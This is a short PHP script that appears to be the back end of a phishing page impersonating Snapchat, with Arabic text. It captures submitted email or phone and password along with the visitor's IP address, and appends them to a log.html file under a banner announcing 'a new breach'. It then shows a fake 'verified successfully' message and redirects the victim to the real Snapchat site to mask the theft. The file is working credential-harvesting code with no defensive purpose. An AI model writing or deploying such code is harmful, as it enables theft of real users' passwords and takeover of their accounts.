<?php
header('Content-Type: text/html; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $identifier = $_POST['identifier'] ?? 'غير مدخل';
    $password = $_POST['password'] ?? 'غير مدخل';
    $ip = $_SERVER['REMOTE_ADDR'];
    $time = date('Y-m-d H:i:s');

    $report = "<pre style='direction:ltr; font-family:monospace;'>";
    $report .= "========================================\n";
    $report .= "🔓 تم اختراق جديد في $time\n";
    $report .= "========================================\n";
    $report .= "📧 البريد/الهاتف : $identifier\n";
    $report .= "🔑 كلمة المرور   : $password\n";
    $report .= "🌐 IP Address    : $ip\n";
    $report .= "========================================\n";
    $report .= "</pre>";

    // حفظ كـ HTML عشان الترميز
    file_put_contents('log.html', $report, FILE_APPEND | LOCK_EX);

    header("Refresh: 2; URL=https://www.snapchat.com/");
    echo "تم التحقق بنجاح، جارٍ التوجيه...";
    exit;
}
?>
